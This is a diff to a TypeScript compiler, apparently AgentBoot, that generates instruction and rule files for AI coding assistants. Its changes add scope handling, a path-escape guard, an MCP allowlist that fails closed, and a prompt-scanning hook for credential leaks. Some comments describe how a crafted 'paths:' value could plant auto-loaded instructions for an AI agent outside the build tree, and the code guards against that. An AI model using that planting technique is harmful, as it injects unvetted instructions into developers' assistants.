+        // Legacy format: append to .windsurfrules. This file has no frontmatter
+        // and no scoping mechanism — a degraded channel of a translated
+        // platform — so the scope rides as prose. Dropping the block instead
+        // would be the same content-loss failure in the other direction.
         const windsurfDir = path.join(distPath, "windsurf", scopePath);
         ensureDir(windsurfDir);
         const rulesPath = path.join(windsurfDir, ".windsurfrules");
         const existing = fs.existsSync(rulesPath) ? fs.readFileSync(rulesPath, "utf-8") : "";
         const separator = existing ? "\n---\n\n" : "";
-        fs.writeFileSync(rulesPath, `${existing}${separator}${strippedContent}\n`, "utf-8");
+        const legacyBody = globs.length > 0
+          ? `${scopePreamble(globs)}\n${strippedContent}`
+          : strippedContent;
+        fs.writeFileSync(rulesPath, `${existing}${separator}${legacyBody}\n`, "utf-8");
         continue;
       }
 
@@ -1026,6 +1527,48 @@ function compileInstructions(
         // .instructions.md) must open with the YAML delimiter — withProvenance
         // places the header after the frontmatter when present.
         finalContent = withProvenance(content, srcPath, config);
+      }
+
+      // F-6: project the path scope onto this platform.
+      const scope = inspectScope(content);
+      if (platform === "jetbrains" && APPLY_TO_PROJECTION["jetbrains"]?.support === "translated") {
+        // JetBrains reads `globs:`, not `applyTo:` — the key was written
+        // verbatim and was therefore inert. Rewrite the ONE line in place;
+        // regenerating the frontmatter would destroy the id/slug/hash identity
+        // stamp (decision-0005) that artifact-identity.test.ts asserts.
+        // NF2-3: the key's VALUE may span multiple lines (a block sequence or a
+        // block scalar). A single-line `.replace(/^\s*applyTo:.*$/im, …)` left
+        // the continuation lines orphaned under the new `globs:` value, which
+        // js-yaml rejects ("bad indentation of a mapping entry (3:3)") — so
+        // fixing the parser and leaving the rewriter single-line just moved the
+        // invalid-YAML artifact from one platform to another.
+        finalContent = scope.globs.length > 0
+          ? rewriteFrontmatterKeyBlock(finalContent, "applyTo", `globs: ${JSON.stringify(scope.globs)}`)
+          // No globs → always-on. JetBrains treats a rule with no `globs:` as
+          // always-on, matching what compileGotchas emits.
+          : rewriteFrontmatterKeyBlock(finalContent, "applyTo", null);
+      } else if (platform === "copilot" && scope.globs.length > 0) {
+        // NF2-3: Copilot's `applyTo:` is a COMMA-SEPARATED STRING, and this
+        // emitter passed the source line through verbatim. A source authored as
+        // a YAML flow sequence therefore reached Copilot as a flow sequence
+        // while cursor/windsurf/jetbrains got a re-serialized list — two
+        // platforms disagreeing about the same rule's scope, from one source.
+        // Re-serialize here too, from the same parsed globs, so all four agree
+        // by construction rather than by coincidence.
+        finalContent = rewriteFrontmatterKeyBlock(
+          finalContent,
+          "applyTo",
+          `applyTo: "${yamlDoubleQuoted(scope.globs.join(", "))}"`,
+        );
+      } else if (
+        scope.globs.length > 0 &&
+        (APPLY_TO_PROJECTION[platform]?.support ?? "unsupported") === "unsupported"
+      ) {
+        // This target has no scoping mechanism at all. Say so IN the artifact:
+        // that converts a silent unscoped injection into an explicitly
+        // conditional instruction, and is why acknowledging the gap is a
+        // decision rather than a rubber stamp.
+        finalContent = insertAfterFrontmatter(finalContent, scopePreamble(scope.globs));
       }
       fs.writeFileSync(path.join(outDir, file), finalContent, "utf-8");
     }
@@ -1078,30 +1621,33 @@ function compileGotchas(
     // AB-129: Cursor output — gotchas become glob-scoped .mdc rules
     if (outputFormats.includes("cursor")) {
       const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      // Strip surrounding quotes from YAML values (parseFrontmatter preserves them)
-      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
-      const globs = pathsStr ? pathsStr.split(",").map(p => p.trim()).filter(Boolean) : undefined;
+      // V1: ONE glob parser (scope-projection.ts), not a seventh hand-rolled
+      // `.replace(quotes).split(",")` — that one splits `{ts,tsx}` into two dead
+      // globs and bakes a trailing YAML comment into the glob.
+      const scopeGlobs = readScopeGlobs(content, "paths").globs;
+      const globs = scopeGlobs.length > 0 ? scopeGlobs : undefined;
       const name = path.basename(file, ".md");
       const cursorRulesDir = path.join(distPath, "cursor", scopePath, "rules");
       ensureDir(cursorRulesDir);
       const cursorDesc = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
       const cursorContent = buildCursorRule(
         cursorDesc,
-        content.replace(/^---\n[\s\S]*?\n---\n*/, ""), // strip frontmatter
-        { globs, alwaysApply: false }
+        stripFrontmatterBody(content),
+        // H3: `alwaysApply: false` with NO globs is a rule that applies
+        // NOWHERE. compileInstructions was fixed to `globs.length === 0` and
+        // this sibling emitter kept the hardcoded false — the same two-call-site
+        // drift, one round later. An unscoped gotcha is always-on by definition.
+        { globs, alwaysApply: !globs }
       );
       fs.writeFileSync(path.join(cursorRulesDir, `${name}.mdc`), cursorContent, "utf-8");
     }
 
     // AB-146 + Phase 11 A1e: Windsurf gotchas — .windsurf/rules/*.md (modern) + legacy .windsurfrules
     if (outputFormats.includes("windsurf")) {
-      const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
-      const globs = pathsStr ? pathsStr.split(",").map(p => p.trim()).filter(Boolean) : undefined;
+      const scopeGlobs = readScopeGlobs(content, "paths").globs;
+      const globs = scopeGlobs.length > 0 ? scopeGlobs : undefined;
       const gotchaName = path.basename(file, ".md");
-      const gotchaContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();
+      const gotchaContent = stripFrontmatterBody(content).replace(/<!--[\s\S]*?-->/g, "").trim();
 
       // Modern format: .windsurf/rules/*.md with trigger frontmatter
       const windsurfRulesDir = path.join(distPath, "windsurf", scopePath, ".windsurf", "rules");
@@ -1126,14 +1672,11 @@ function compileGotchas(
 
     // Phase 11 A1c: Gemini gotchas — subdirectory GEMINI.md (NOT .gemini/rules/)
     if (outputFormats.includes("gemini")) {
-      const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
-      const geminiContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").replace(/<!--[\s\S]*?-->/g, "").trim();
+      const patterns = readScopeGlobs(content, "paths").globs;
+      const geminiContent = stripFrontmatterBody(content).replace(/<!--[\s\S]*?-->/g, "").trim();
 
-      if (pathsStr) {
+      if (patterns.length > 0) {
         // Extract directory component from path patterns
-        const patterns = pathsStr.split(",").map(p => p.trim()).filter(Boolean);
         let targetDir: string | null = null;
         for (const pattern of patterns) {
           // Extract directory: "src/auth/**" → "src/auth", "**/*.lambda.ts" → null (wildcard-only)
@@ -1144,8 +1687,35 @@ function compileGotchas(
           }
         }
         if (targetDir) {
-          // Directory-scoped: write GEMINI.md in the target directory
-          const geminiSubDir = path.join(distPath, "gemini", scopePath, targetDir);
+          // Directory-scoped: write GEMINI.md in the target directory.
+          //
+          // `targetDir` is CONTENT, not config — it is sliced out of a gotcha's
+          // `paths:` frontmatter, which arrives via `agentboot import`, via a
+          // contributed gotcha, via the marketplace. GEMINI.md is auto-loaded by
+          // the Gemini CLI, so an unchecked join here plants an unsigned,
+          // unmanifested, unprunable instruction file at an attacker-chosen
+          // absolute path. Contained, and fatal on violation: a gotcha that
+          // tries to escape dist/ is a finding, and dropping it quietly would be
+          // the silence-is-not-success failure one level down.
+          const geminiScopeRoot = path.join(distPath, "gemini", scopePath);
+          let geminiSubDir: string;
+          try {
+            geminiSubDir = resolveWithin(
+              geminiScopeRoot,
+              [targetDir],
+              `gotcha ${path.basename(file)}: paths: "${targetDir}"`
+            );
+          } catch (err) {
+            if (err instanceof PathEscapeError) {
+              fatal(
+                `gotcha ${path.relative(HUB_ROOT, file)} has a paths: pattern that escapes dist/: ` +
+                  `"${targetDir}". Gemini writes GEMINI.md into the directory a pattern names, and ` +
+                  `GEMINI.md is auto-loaded as instructions — a pattern that climbs out of dist/ would ` +
+                  `plant instructions outside the build tree. Use a pattern relative to the repo root.`
+              );
+            }
+            throw err;
+          }
           ensureDir(geminiSubDir);
           const geminiSubPath = path.join(geminiSubDir, "GEMINI.md");
           const existingGemini = fs.existsSync(geminiSubPath) ? fs.readFileSync(geminiSubPath, "utf-8") : "";
@@ -1170,19 +1740,28 @@ function compileGotchas(
     // AB-130: Copilot scoped instructions — gotchas with paths: become .instructions.md
     if (outputFormats.includes("copilot")) {
       const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      // Strip surrounding quotes from YAML values (parseFrontmatter preserves them)
-      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
-      if (pathsStr) {
+      const copilotGlobs = readScopeGlobs(content, "paths").globs;
+      // H3: a gotcha with no `paths:` used to be emitted to NOTHING on Copilot —
+      // `grep -c unscoped.instructions.md` was 0 — while claude and skill both
+      // received it. Silently dropping an artifact on one configured platform is
+      // the same class as delivering it unscoped: the operator is not told.
+      // Copilot's universal scope is `**`.
+      {
+        // ", " not "," — the emitted spacing is unchanged from the hand-rolled
+        // version, so re-serializing from the parsed globs is not a gratuitous
+        // diff in every consumer's .instructions.md.
+        const copilotApplyTo = copilotGlobs.length > 0 ? copilotGlobs.join(", ") : "**";
         const name = path.basename(file, ".md");
         const description = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
         const copilotInstrDir = path.join(distPath, "copilot", scopePath, "instructions");
         ensureDir(copilotInstrDir);
-        const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
+        const strippedContent = stripFrontmatterBody(content).trim();
         const copilotInstrContent = [
           "---",
-          `description: "${description}"`,
-          `applyTo: "${pathsStr}"`,
+          `description: "${yamlDoubleQuoted(description)}"`,
+          // Re-serialized from the PARSED globs, so a comment or a block
+          // sequence in the source cannot travel into the emitted frontmatter.
+          `applyTo: "${yamlDoubleQuoted(copilotApplyTo)}"`,
           "---",
           "",
           strippedContent,
@@ -1195,18 +1774,16 @@ function compileGotchas(
     // AB-158: JetBrains AI Assistant gotchas — .aiassistant/rules/ with globs: frontmatter
     if (outputFormats.includes("jetbrains")) {
       const fm = parseFrontmatter(content);
-      const rawPaths = fm?.get("paths");
-      const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
+      const jbGlobs = readScopeGlobs(content, "paths").globs;
       const name = path.basename(file, ".md");
       const description = (fm?.get("description") ?? name).replace(/^["']|["']$/g, "");
       const jetbrainsRulesDir = path.join(distPath, "jetbrains", scopePath, ".aiassistant", "rules");
       ensureDir(jetbrainsRulesDir);
-      const strippedContent = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
+      const strippedContent = stripFrontmatterBody(content).trim();
 
       const frontmatterLines = ["---"];
-      if (pathsStr) {
-        const globs = pathsStr.split(",").map(p => p.trim()).filter(Boolean);
-        frontmatterLines.push(`globs: ${JSON.stringify(globs)}`);
+      if (jbGlobs.length > 0) {
+        frontmatterLines.push(`globs: ${JSON.stringify(jbGlobs)}`);
       }
       frontmatterLines.push(`description: "${description}"`);
       frontmatterLines.push("---");
@@ -1291,7 +1868,7 @@ function generateClaudeMd(
   for (const traitName of traitNames) {
     const trait = traits.get(traitName);
     if (trait) {
-      fs.writeFileSync(path.join(traitsDir, `${traitName}.md`), trait.content, "utf-8");
+      fs.writeFileSync(path.join(traitsDir, `${traitName}.md`), trait.raw, "utf-8");
     }
   }
 
@@ -1382,10 +1959,14 @@ function generateGeminiMd(
       ];
       const instrPath = candidatePaths.find((p) => fs.existsSync(p));
       if (instrPath) {
-        const content = fs.readFileSync(instrPath, "utf-8")
-          .replace(/^---\n[\s\S]*?\n---\n*/, "")
+        const raw = fs.readFileSync(instrPath, "utf-8");
+        const content = stripFrontmatterBody(raw)
           .replace(/<!--[\s\S]*?-->/g, "")
           .trim();
+        // F-6: GEMINI.md is always-on, so a narrow scope is lost here. Carry it
+        // as prose rather than injecting the rule as if it were global.
+        const gScope = inspectScope(raw);
+        if (gScope.globs.length > 0) lines.push(scopePreamble(gScope.globs), "");
         lines.push(content, "");
       }
     }
@@ -1421,6 +2002,41 @@ function generateGeminiMd(
 // ---------------------------------------------------------------------------
 // AGENTS.md generation — universal cross-tool standard
 // ---------------------------------------------------------------------------
+
+/**
+ * Close a fenced code block that a line-cap cut in half.
+ *
+ * The trait tier below is capped at 50 lines so AGENTS.md stays a reasonable
+ * size. When that cut lands between a ```json opener and its closer, the file
+ * ships an opener with no closer — and in every renderer that reads markdown,
+ * an unterminated fence swallows the ENTIRE REST OF THE DOCUMENT into one code
+ * block. On the shipped corpus that was ~280 lines: six behavioural traits, the
+ * path-scoped rules and every agent definition, all displayed as literal JSON.
+ * AGENTS.md is the universal-official surface — the one artifact every platform
+ * reads — so this is the most-read output the compiler produces.
+ *
+ * Appending the closer keeps the truncation marker that follows it as prose
+ * rather than as the first line of code nobody asked for. The fence grammar
+ * here matches CommonMark's closing rule (same character, at least as long as
+ * the opener, nothing else on the line) so the emitted document balances under
+ * the same reading the emitted-corpus invariant applies.
+ */
+function closeTruncatedFence(lines: string[]): string[] {
+  let open: { char: string; len: number } | null = null;
+  for (const line of lines) {
+    const trimmed = line.trim();
+    const fence = /^(`{3,}|~{3,})/.exec(trimmed);
+    if (!fence) continue;
+    const ch = fence[1]![0]!;
+    const len = fence[1]!.length;
+    if (open === null) {
+      open = { char: ch, len };
+    } else if (ch === open.char && len >= open.len && trimmed === ch.repeat(len)) {
+      open = null;
+    }
+  }
+  return open === null ? lines : [...lines, open.char.repeat(open.len)];
+}
 
 function generateAgentsMd(
   config: AgentBootConfig,
@@ -1470,9 +2086,14 @@ function generateAgentsMd(
 
       if (instrPath) {
         const content = fs.readFileSync(instrPath, "utf-8");
-        const contentWithoutFrontmatter = content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
+        const contentWithoutFrontmatter = stripFrontmatterBody(content).trim();
         // B4: Inline full content instead of just first line
         lines.push(`### ${instrName}`, "");
+        // F-6: AGENTS.md is always-on (feeds both `agents` and `codex`), so a
+        // narrow applyTo cannot be expressed — say so instead of shipping the
+        // rule as though it were global.
+        const aScope = inspectScope(content);
+        if (aScope.globs.length > 0) lines.push(scopePreamble(aScope.globs), "");
         lines.push(contentWithoutFrontmatter);
         lines.push("");
       }
@@ -1489,11 +2110,14 @@ function generateAgentsMd(
         const trait = traitsMap.get(traitName)!;
         lines.push(`### ${traitName}`, "");
         // Include trait content (strip frontmatter, keep concise)
-        const traitContent = trait.content.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
-        // Limit to first ~50 lines to prevent oversized AGENTS.md
-        const traitLines = traitContent.split("\n").slice(0, 50);
+        const traitContent = stripFrontmatterBody(trait.content).trim();
+        // Limit to first ~50 lines to prevent oversized AGENTS.md. The cut can
+        // land inside a code fence, so close anything it left open — otherwise
+        // the rest of the document renders as one code block.
+        const allTraitLines = traitContent.split("\n");
+        const traitLines = closeTruncatedFence(allTraitLines.slice(0, 50));
         lines.push(traitLines.join("\n"));
-        if (traitContent.split("\n").length > 50) {
+        if (allTraitLines.length > 50) {
           lines.push("", "*(truncated for brevity)*");
         }
         lines.push("");
@@ -1508,11 +2132,10 @@ function generateAgentsMd(
       lines.push("## Path-Scoped Rules", "");
       for (const gFile of gotchaFiles) {
         const gContent = fs.readFileSync(path.join(gotchasDir, gFile), "utf-8");
-        const fm = parseFrontmatter(gContent);
-        const rawPaths = fm?.get("paths");
-        const pathsStr = rawPaths?.replace(/^["']|["']$/g, "");
+        const gGlobs = readScopeGlobs(gContent, "paths").globs;
+        const pathsStr = gGlobs.length > 0 ? gGlobs.join(", ") : undefined;
         const gName = path.basename(gFile, ".md");
-        const gBody = gContent.replace(/^---\n[\s\S]*?\n---\n*/, "").trim();
+        const gBody = stripFrontmatterBody(gContent).trim();
 
         lines.push(`### ${gName}`);
         if (pathsStr) lines.push(`**Applies to:** \`${pathsStr}\``);
@@ -1608,6 +2231,39 @@ function generateCompositionManifest(
 // AB-26: settings.json generation
 // ---------------------------------------------------------------------------
 
+/**
+ * G1a / AB-DEF-10: warn at emit on a permission rule the platform never
+ * consults.
+ *
+ * `validate` fails on the deny form, but `build` and `sync` never call validate
+ * — the same routing gap that put the dangerous-hook check off the path it
+ * protects. So the compiler says it too, at the moment it writes the rule into
+ * the managed-settings channel. The verb table and the evidence behind it live
+ * in lib/permission-rules.ts; this is the report.
+ *
+ * Warn rather than fatal here on purpose: `build` is not the gate (validate is,
+ * and it errors), and an inert rule is a control that does nothing rather than a
+ * control that does something wrong. Refusing to build over it would strand a
+ * hub whose only problem is a dead line — but shipping it silently is the
+ * defect this closes.
+ */
+function warnInertPermissionRules(
+  lists: Array<{ where: string; kind: "allow" | "deny"; rules: string[] | undefined }>,
+): void {
+  for (const { where, kind, rules } of lists) {
+    for (const finding of inertPermissionRules(rules, where)) {
+      const line = `  ⚠ ${finding.message}`;
+      // A deny is the one that reads as a control; say so in red.
+      log(kind === "deny" ? chalk.red(line) : chalk.yellow(line));
+      if (kind === "deny") {
+        log(chalk.gray(`    \`agentboot validate --strict\` fails on this — it is emitted here so a`));
+        log(chalk.gray(`    build-only pipeline still sees it. The rule is being written to the`));
+        log(chalk.gray(`    managed-settings channel exactly as authored, enforcing nothing.`));
+      }
+    }
+  }
+}
+
 function generateSettingsJson(
   config: AgentBootConfig,
   distPath: string,
@@ -1653,6 +2309,13 @@ function generateSettingsJson(
     log(chalk.yellow("  ⚠ Generating settings.json with permissions — these will be synced to all target repos"));
   }
 
+  if (permissions) {
+    warnInertPermissionRules([
+      { where: "claude.permissions.deny", kind: "deny", rules: permissions.deny },
+      { where: "claude.permissions.allow", kind: "allow", rules: permissions.allow },
+    ]);
+  }
+
   const settings: Record<string, unknown> = {};
   if (hooks) settings["hooks"] = hooks;
   if (permissions) settings["permissions"] = permissions;
@@ -1681,9 +2344,18 @@ function generateMcpJson(
   log(chalk.yellow("  ⚠ Generating .mcp.json with MCP servers — these will be synced to all target repos"));
 
   // AB-143: MCP governance — filter unapproved servers (without mutating original config)
+  //
+  // NF3-1: the emitter's half of the same fail-open as validate.ts. The filter
+  // was gated on `config.mcp.approved` being present, so `enforceApproved: true`
+  // with no approved list — nothing approved, therefore everything unapproved —
+  // skipped filtering entirely and wrote every configured server into
+  // dist/claude/core/.mcp.json, exit 0, no diagnostic.
+  //
+  // An absent allowlist is an EMPTY allowlist. A narrowing directive whose input
+  // is missing narrows to nothing; it never widens to everything.
   let filteredServers = mcpServers;
-  if (config.mcp?.enforceApproved && config.mcp.approved) {
-    const approvedNames = new Set(config.mcp.approved.map(s => s.name));
+  if (config.mcp?.enforceApproved) {
+    const approvedNames = new Set((config.mcp.approved ?? []).map(s => s.name));
     filteredServers = Object.fromEntries(
       Object.entries(mcpServers as Record<string, unknown>).filter(([name]) => {
         if (!approvedNames.has(name)) {
@@ -1699,17 +2371,39 @@ function generateMcpJson(
   const mcpPath = path.join(distPath, "claude", scopePath, ".mcp.json");
   fs.writeFileSync(mcpPath, JSON.stringify(mcpJson, null, 2) + "\n", "utf-8");
 
-  // AB-143: Generate MCP governance manifest
+  // AB-143: Generate MCP governance manifest.
+  //
+  // R2-10: this file is an AUDITOR ARTIFACT, not a consumed one.
+  // `grep -rn mcp-governance` over the whole repo returns exactly this write —
+  // no reader, in AgentBoot or on any platform. That is a legitimate product
+  // shape (an evidence record for a reviewer to read, alongside the enforcement
+  // that actually happens in .mcp.json filtering next to it), and it is the same
+  // shape `managed.guardrails.forcePlugins` carries as `emittedBy: []`.
+  //
+  // What was NOT legitimate is announcing it as though something consumed it.
+  // "→ MCP governance manifest written" reads, in a log full of emitted
+  // artifacts, as a control that landed. The enforcement it documents is the
+  // filtering above; this is the record OF that decision. The line now says so,
+  // so nobody has to grep to find out — which is exactly what a reviewer would
+  // otherwise have to do to know whether their approved-list is enforced.
   if (config.mcp?.approved) {
     const mcpManifest = {
       approved: config.mcp.approved,
       enforceApproved: config.mcp.enforceApproved ?? false,
       required: config.mcp.required ?? [],
       generatedAt: new Date().toISOString(),
+      // In the file too, not only in the build log: the artifact outlives the
+      // log, and it is the artifact an auditor opens.
+      note:
+        "Evidence record only. AgentBoot reads no field of this file; the enforcement it " +
+        "describes is the approved-list filtering applied to .mcp.json in the same directory.",
     };
     const manifestPath = path.join(distPath, "claude", scopePath, "mcp-governance.json");
     fs.writeFileSync(manifestPath, JSON.stringify(mcpManifest, null, 2) + "\n", "utf-8");
-    log(chalk.gray(`  → MCP governance manifest written`));
+    log(chalk.gray(
+      `  → MCP governance manifest written (evidence record — read by no command; ` +
+      `the enforcement is the .mcp.json filtering above)`,
+    ));
   }
 
 }
@@ -1723,7 +2417,9 @@ function generateCrossPlatformMcpConfigs(
   distPath: string,
   scopePath: string,
 ): void {
-  const outputFormats = config.personas?.outputFormats ?? [];
+  // A5: was `?? []` — an omitted personas.outputFormats silently emitted NO
+  // cross-platform MCP config while the build reported success.
+  const outputFormats = config.personas?.outputFormats ?? [...DEFAULT_OUTPUT_FORMATS];
   const abMcpEntry = { command: "npx", args: [agentbootNpxSpec(), "mcp-server"] };
 
   if (outputFormats.includes("cursor")) {
@@ -1893,16 +2589,27 @@ function generateCopilotHooks(
  * Generate .agents/skills/<persona>/SKILL.md for Codex + cross-tool consumption.
  * Copies from dist/skill/ output (already compiled).
  */
+/**
+ * Mirror `dist/skill/<scopePath>/` into `<platform>/<scopePath>/.agents/skills/`.
+ *
+ * Returns the number of SKILL.md files written, so the caller can report what
+ * actually happened. It previously returned void and every call site printed an
+ * unconditional green tick — including on the early return below, where the
+ * function writes nothing at all. That is the same "Exported 0 skill(s)" shape
+ * already fixed once on this branch: a success line is a claim about the
+ * filesystem, and a claim nothing checks is how an empty deliverable ships.
+ */
 function generateCrossToolSkills(
   distPath: string,
   scopePath: string,
   targetPlatformDir: string,
-): void {
+): number {
   const skillSrcDir = path.join(distPath, "skill", scopePath);
-  if (!fs.existsSync(skillSrcDir)) return;
+  if (!fs.existsSync(skillSrcDir)) return 0;
 
   const agentsSkillsDir = path.join(distPath, targetPlatformDir, scopePath, ".agents", "skills");
 
+  let written = 0;
   for (const entry of fs.readdirSync(skillSrcDir, { withFileTypes: true })) {
     if (!entry.isDirectory()) continue;
     if (entry.name === "instructions" || entry.name === "gotchas") continue; // skip non-persona dirs
@@ -1911,8 +2618,33 @@ function generateCrossToolSkills(
       const destDir = path.join(agentsSkillsDir, entry.name);
       ensureDir(destDir);
       fs.copyFileSync(skillMd, path.join(destDir, "SKILL.md"));
+      written++;
     }
   }
+  return written;
+}
+
+/**
+ * Report a `.agents/skills/` emission truthfully.
+ *
+ * Silence is not success and neither is a green tick: when nothing was written
+ * the operator is told so, and told WHY, because the only cause is a config
+ * one line away — `.agents/skills/` is mirrored from `dist/skill/`, so without
+ * "skill" in personas.outputFormats there is nothing to mirror.
+ */
+function logCrossToolSkills(scopePath: string, count: number, outputFormats: readonly string[]): void {
+  const where = scopePath === "core" ? "" : ` [${scopePath}]`;
+  if (count > 0) {
+    log(chalk.green(`  .agents/skills/ generated (cross-tool)${where} — ${count} skill(s)`));
+    return;
+  }
+  if (!outputFormats.includes("skill")) {
+    log(chalk.yellow(
+      `  ⚠ .agents/skills/${where}: nothing emitted — add "skill" to personas.outputFormats`
+    ));
+    return;
+  }
+  log(chalk.yellow(`  ⚠ .agents/skills/${where}: nothing emitted — no persona SKILL.md at this scope`));
 }
 
 // ---------------------------------------------------------------------------
@@ -1938,7 +2670,9 @@ function compileDomains(
   configDir: string,
   distPath: string,
   traits: Map<string, TraitContent>,
-  outputFormats: string[]
+  outputFormats: string[],
+  /** C4: required for the same reason as compileInstructions' — see there. */
+  scopeSeen: Map<string, ScopedArtifact>,
 ): CompileResult[] {
   const domains = config.domains;
   if (!domains || domains.length === 0) return [];
@@ -1947,9 +2681,7 @@ function compileDomains(
   const results: CompileResult[] = [];
 
   for (const domainRef of domains) {
-    const domainPath = typeof domainRef === "string"
-      ? path.resolve(configDir, domainRef)
-      : path.resolve(configDir, domainRef.path ?? `./domains/${domainRef.name}`);
+    const domainPath = resolveDomainPath(domainRef, configDir);
 
     if (!fs.existsSync(domainPath)) {
       log(chalk.yellow(`  ⚠ Domain not found: ${domainPath}`));
@@ -2010,7 +2742,8 @@ function compileDomains(
       distPath,
       `domains/${domainName}`,
       config,
-      outputFormats
+      outputFormats,
+      scopeSeen,
     );
   }
 
@@ -2074,7 +2807,7 @@ function generatePluginOutput(
   const pluginTraitsDir = path.join(pluginDir, "traits");
   ensureDir(pluginTraitsDir);
   for (const [name, trait] of traits) {
-    fs.writeFileSync(path.join(pluginTraitsDir, `${name}.md`), trait.content, "utf-8");
+    fs.writeFileSync(path.join(pluginTraitsDir, `${name}.md`), trait.raw, "utf-8");
     traitEntries.push({ id: name, path: `traits/${name}.md` });
   }
 
@@ -2190,7 +2923,14 @@ function generatePluginOutput(
 // Claude Code event names are canonical; each emitter translates as needed.
 //
 // Cross-platform enforcement caveats (docs/research/platform-refresh-2026-07-11.md):
-//   - Claude Code : matcher is EXACT-match (no substring); exit 2 blocks a tool.
+//   - Claude Code : matcher is a REGEX — `new RegExp(matcher).test(toolName)` —
+//                   not a literal tool-name comparison. Pipe alternation
+//                   ("Edit|Write") is supported and is what we emit. The hazard
+//                   runs the other way: a matcher is silently PERMISSIVE, since
+//                   "Edit" also matches "NotebookEdit". See
+//                   ComplianceHookBinding.matcher for the ground truth and how
+//                   it was established; do not restate it here. exit 2 blocks
+//                   a tool.
 //   - Codex       : same event names as CC, but stdin is snake_case while the
 //                   output envelope is camelCase (hookSpecificOutput /
 //                   permissionDecision); tool coverage is partial (shell + patch
@@ -2214,7 +2954,26 @@ interface ComplianceHookBinding {
   script: string;
   /** Canonical Claude Code event name. */
   ccEvent: string;
-  /** CC matcher (exact-match). "" = all events/tools. */
+  /**
+   * CC tool matcher. "" = all tools for this event.
+   *
+   * This is a REGEX, not a literal tool-name comparison.
+   * This comment used to say "exact-match", which would have made the
+   * `Edit|Write|Bash` binding below a dead hook that silently logged no
+   * telemetry — the wrong half of the contradiction. Verified against the shipping
+   * Claude Code binary (v2.1.226), which compiles the matcher and tests it:
+   *
+   *     try { const re = new RegExp(matcher); if (re.test(toolName)) ... }
+   *     catch { log(`Invalid regex pattern in hook matcher: ${matcher}`) }
+   *
+   * and whose own settings-validation hint names the pipe form as supported:
+   * "The matcher is a string: a tool name ("Bash"), pipe-separated list
+   * ("Edit|Write"), or empty to match all."
+   *
+   * Because it is a regex, a matcher is silently permissive if written
+   * carelessly — "Edit" alone also matches "NotebookEdit". Keep matchers to
+   * literal tool names joined by `|`; the legality test pins that.
+   */
   matcher: string;
   /** Timeout in milliseconds. CC/Copilot use ms; the Codex emitter converts to seconds. */
   timeoutMs: number;
@@ -2224,7 +2983,12 @@ interface ComplianceHookBinding {
   requiresDenyTools?: boolean;
 }
 
-const COMPLIANCE_HOOK_BINDINGS: ComplianceHookBinding[] = [
+/**
+ * Exported so the matcher-legality test can enumerate EVERY binding rather
+ * than the handful someone remembered to assert on. A new row with an illegal
+ * matcher must fail the suite the moment it is added.
+ */
+export const COMPLIANCE_HOOK_BINDINGS: ComplianceHookBinding[] = [
   { script: "agentboot-input-scan.sh",  ccEvent: "UserPromptSubmit", matcher: "",                timeoutMs: 5000 },
   // NOT async: an async Stop hook cannot deliver a blocking decision — its
   // exit code / stdout are ignored by the platform. Blocking output scan
@@ -2308,8 +3072,27 @@ set -uo pipefail
 HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
 command -v node >/dev/null 2>&1 || { echo '{"decision":"block","reason":"AgentBoot: node is required for input scanning"}'; exit 2; }
 
-INPUT=$(cat)
-PROMPT=$(printf '%s' "$INPUT" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{const j=JSON.parse(d);process.stdout.write(j.prompt||'')}catch{process.stdout.write('')}})") || { echo '{"decision":"block","reason":"AgentBoot: Failed to parse hook input"}'; exit 2; }
+${hookInputCapPrelude({
+    overCapStderr: "prompt exceeds $MAX_HOOK_INPUT_BYTES bytes — cannot scan it in full.",
+    action: "block",
+    blockReason:
+      "AgentBoot: prompt exceeds the hook input limit and could not be scanned. Split it, or raise AGENTBOOT_MAX_HOOK_INPUT_BYTES deliberately.",
+  })}
+${hookJsonExtract({
+    variable: "PROMPT",
+    subject: "the prompt",
+    // R4V-1: `j.prompt||''` NEVER THROWS, so the extractor's own catch could not
+    // fire and a payload with no `prompt` field was scanned as an empty string
+    // at exit 0 — on a blocking DLP gate. The object-shape check one layer up
+    // stopped `42`/`"x"`/`[]` but not `{}` or `{"promt":...}`, which is what a
+    // renamed or wrongly-framed field actually looks like.
+    // An ABSENT field is a payload we do not understand; an EMPTY STRING is a
+    // genuinely empty prompt. Only the first is a failure.
+    extract: "if(typeof j.prompt!=='string')throw 0;process.stdout.write(j.prompt)",
+    action: "block",
+    blockReason:
+      "AgentBoot: the hook payload could not be parsed, so the prompt could not be scanned. The gate will not run on a payload it cannot understand.",
+  })}
 
 # Scan for potential credential leaks in prompts
 PATTERNS=(
@@ -2372,8 +3155,30 @@ set -uo pipefail
 HOME="\${HOME:-\${USERPROFILE:-$(node -e "console.log(require('os').homedir())")}}"
 command -v node >/dev/null 2>&1 || exit 0
 
-INPUT=$(cat)
